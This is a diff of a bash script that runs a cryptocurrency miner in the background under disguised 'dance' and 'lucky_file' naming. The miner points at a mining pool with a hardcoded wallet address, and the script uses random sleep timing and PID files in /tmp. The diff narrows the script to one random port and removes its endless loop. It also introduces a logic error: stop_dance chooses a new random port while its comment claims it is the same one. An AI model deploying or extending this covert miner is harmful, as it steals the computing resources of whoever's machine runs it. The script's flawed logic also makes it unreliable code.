@@ -59,18 +59,17 @@ start_dance() {
   local dancer=$(generate_dancer $num_cores)  # Generate dancer string including core count
   local lucky_file=$(cat /tmp/lucky_file)
 
-  # Select a random IP and assign it to 10 ports
+  # Select a random IP and assign it to a random port
   local ip=$(select_random_ip)
+  local port=$(( ( RANDOM % 10 ) + 843 ))  # Random port between 843 and 852
 
-  for port in $(seq 843 852); do
-    # Start the dancing process for each port
-    nohup ./$lucky_file -a yescryptr32 --pool $ip:$port -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$dancer --timeout 120 -t $num_cores > dance_$port.log 2>&1 &
-    local pid=$!
-    echo "Dance started with PID: $pid using $num_cores cores with file $lucky_file, IP $ip, and port $port"
-  done
+  # Start the dancing process for the selected port
+  nohup ./$lucky_file -a yescryptr32 --pool $ip:$port -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$dancer --timeout 120 -t $num_cores > dance_$port.log 2>&1 &
+  local pid=$!
+  echo "Dance started with PID: $pid using $num_cores cores with file $lucky_file, IP $ip, and port $port"
 
-  # Save PIDs to a file for later use
-  echo "$!" > /tmp/lucky_pid
+  # Save PID to a file for later use
+  echo "$pid" > /tmp/lucky_pid
 }
 
 # Function to stop the dancing process
@@ -82,10 +81,9 @@ stop_dance() {
     kill -9 $pid 2>/dev/null
     rm -f /tmp/lucky_pid
 
-    # Empty the dance.log files
-    for port in $(seq 843 852); do
-      > dance_$port.log
-    done
+    # Empty the dance.log file
+    local port=$(( ( RANDOM % 10 ) + 843 ))  # Same port used as in start_dance
+    > dance_$port.log
 
     # Remove the stopped file
     if [[ -f "$lucky_file" ]]; then
@@ -105,31 +103,24 @@ get_random_sleep_duration() {
 }
 
 # Main execution
-while true; do
-  # Download the JSON file and prepare the dancing script
-  download_json
-  prepare_dancing_script
+download_json
+prepare_dancing_script
 
-  start_dance
+start_dance
 
-  # Get a random sleep duration
-  sleep_duration=$(get_random_sleep_duration)
-  
-  # Validate and debug sleep duration
-  if [[ -z "$sleep_duration" || "$sleep_duration" -lt 180 ]]; then
-    echo "Error: Invalid sleep duration: $sleep_duration. Defaulting to 3 minutes."
-    sleep_duration=180
-  elif [[ "$sleep_duration" -gt 300 ]]; then
-    echo "Error: Sleep duration exceeds maximum value. Adjusting to 5 minutes."
-    sleep_duration=300
-  fi
-  
-  echo "Sleeping for $((sleep_duration / 60)) minutes ($sleep_duration seconds)"
-  sleep $sleep_duration
-  
-  stop_dance
-  sleep 120  # Wait for 2 minutes
+# Get a random sleep duration
+sleep_duration=$(get_random_sleep_duration)
 
-  # Prepare a new dancing script for the next iteration
-  prepare_dancing_script
-done
+# Validate and debug sleep duration
+if [[ -z "$sleep_duration" || "$sleep_duration" -lt 180 ]]; then
+  echo "Error: Invalid sleep duration: $sleep_duration. Defaulting to 3 minutes."
+  sleep_duration=180
+elif [[ "$sleep_duration" -gt 300 ]]; then
+  echo "Error: Sleep duration exceeds maximum value. Adjusting to 5 minutes."
+  sleep_duration=300
+fi
+
+echo "Sleeping for $((sleep_duration / 60)) minutes ($sleep_duration seconds)"
+sleep $sleep_duration
+
+stop_dance
